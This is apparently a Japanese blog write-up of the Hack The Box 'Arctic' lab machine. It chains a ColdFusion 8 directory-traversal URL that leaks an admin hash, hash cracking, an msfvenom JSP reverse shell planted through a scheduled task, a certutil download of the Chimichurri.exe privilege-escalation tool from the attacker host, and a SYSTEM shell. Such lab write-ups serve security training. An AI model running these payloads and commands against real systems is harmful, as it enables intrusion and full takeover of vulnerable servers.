+++ 
draft = false
date = 2022-07-01T18:07:16+09:00
title = "HTB_Arctic_writeup"
description = "HTB_Arctic_writeup"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

# 【Hack The Box】 Arctic Writeup
## Information
- OS：Windows  
- 難易度：Easy  
- IPアドレス：10.129.110.112  
{{< figure src="/images/Arctic1.png" title="Screenshot" class="center" width="800">}}

## Recon
### autoreconでスキャンをし、135ポートと8500ポートが空いていることがわかります。
```shell
$ autorecon 10.129.110.112
Plugin "RPCDump" in rpcdump.py is not a subclass of either PortScan, ServiceScan, or Report.
Plugin "MiniImpacketShell" in smbclient.py is not a subclass of either PortScan, ServiceScan, or Report.
Plugin "SMBConnection" in smbclient.py is not a subclass of either PortScan, ServiceScan, or Report.
[*] Scanning target 10.129.110.112
[!] [10.129.110.112/top-100-udp-ports] UDP scan requires AutoRecon be run with root privileges.
[*] [10.129.110.112/all-tcp-ports] Discovered open port tcp/135 on 10.129.110.112
[*] [10.129.110.112/all-tcp-ports] Discovered open port tcp/8500 on 10.129.110.112
```

### 10.129/110.112:8500にブラウザでアクセスすると、ディレクトリリスティングが表示されました。
{{< figure src="/images/Arctic2.png" title="Screenshot" class="center" width="800">}}

### 色々辿っていくと、Adobe ColdFusionの管理ポータルのログイン画面に辿り着きました。
{{< figure src="/images/Arctic3.png" title="Screenshot" class="center" width="800">}}

### searchsploitで検索してみると、Directory Traversalが可能なものがありました。
```shell
$ searchsploit coldfusion 8
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                 | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                              | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                 | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code E | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                       | multiple/webapps/45979.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                 | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                           | windows/webapps/27755.txt
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                     | multiple/webapps/40346.py
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site  | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String C | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cr | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                       | windows/local/19220.c
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                   | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                             | multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                               | cfm/remote/21548.txt
ColdFusion Scripts Red_Reservations - Database Disclosure                           | asp/webapps/7440.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure           | multiple/remote/22867.pl
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

### Directory Traversalのmultiple/remote/14641.pyを見てみるとディレクトリトラバーサルのコードが記載してあるので、こちらを活用。
```
http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

### パスワードハッシュが表示されました。
```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```
{{< figure src="/images/Arctic4.png" title="Screenshot" class="center" width="800">}}

### hash-identifierでハッシュの種類を特定します。おそらくSHA-1のようです。
```shell
hash-identifier                                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
--------------------------------------------------
```

### John the ripperでパスワードを抽出します。happydayというパスワードです。このパスワードをCloudFusionの管理画面に入力してログインします。
```shell
$ john --format=raw-sha1  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)
1g 0:00:00:00 DONE (2022-05-13 08:34) 100.0g/s 512000p/s 512000c/s 512000C/s jodie..babygrl
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

### JSPのリバースシェルを作成します。
```shell
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f raw > exploit.jsp
Payload size: 1497 bytes
```

### exploit.jspを作成したディレクトリでHTTPサーバをサーブします。
```shell
$ sudo python -m SimpleHTTPServer 80                                       
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 ...
```

### ncで待ち受けます。
```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
```

### リバースシェルを配置するパスを確認します。C:\ColdFusion8\wwwroot\CFIDEです。
{{< figure src="/images/Arctic5.png" title="Screenshot" class="center" width="800">}}

### スケジュールタスクの必要事項を記載し、submitします。
{{< figure src="/images/Arctic6.png" title="Screenshot" class="center" width="800">}}

### タスクをスタートさせます。Actionsの一番左のボタンを押します。
{{< figure src="/images/Arctic7.png" title="Screenshot" class="center" width="800">}}

### 10.129.105.102:8500/CFIDE/exploit.jspnにブラウザでアクセスします。すると、リバースシェルがはれます。
```shell
$ nc -lnvp 4444
listening on [any] 4444 ...


connect to [10.10.14.40] from (UNKNOWN) [10.129.105.102] 49870
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

### user.txtを取ります。（フラグは省略しています）
```shell
C:\Users\tolis\Desktop>more user.txt
more user.txt
4a50a3809e2bd7b1d23b5bf951e4c70f
```

## 権限昇格（諸事情によりIPアドレスが変更になっています）
### windows-exploit-sugesterを使用するために、systeminfoコマンドを実行します。
```shell
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          15/5/2022, 9:37:04 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.045 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.225 MB
Virtual Memory: In Use:    1.060 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.105.182
```

### windows-exploit-sugesterを実行します。
```shell
$ python ./windows-exploit-suggester.py --database 2022-05-14-mssb.xlsx --systeminfo arctic.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

### MS10-059を使用します。
#### kaliでHTTPサーブします。
```shell
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
#### certutilでChimichurri.exeをkaliからダウンロードします。
```shell
C:\ColdFusion8\runtime\bin>certutil -urlcache -split -f "http://10.10.14.40/Chimichurri.exe" Chimichurri.exe
certutil -urlcache -split -f "http://10.10.14.40/Churraskito.exe" Churraskito.exe
****  Online  ****
  0000  ...
  c800
CertUtil: -URLCache command completed successfully.
```

### ncで待ち受けます。
```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
```

### Chimichurri.exeを実行します。
```shell
C:\ColdFusion8\runtime\bin>Chimichurri.exe 10.10.14.40 4445
Chimichurri.exe 10.10.14.40 4445
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\ColdFusion8\runtime\bin>
```

### system権限が取れました。フラグを取ります。（フラグは省略しています）
```shell
$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.105.182] 49609
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system

C:\ColdFusion8\runtime\bin>
```

```shell
C:\Users\Administrator\Desktop>more root.txt
more root.txt
e1b...
```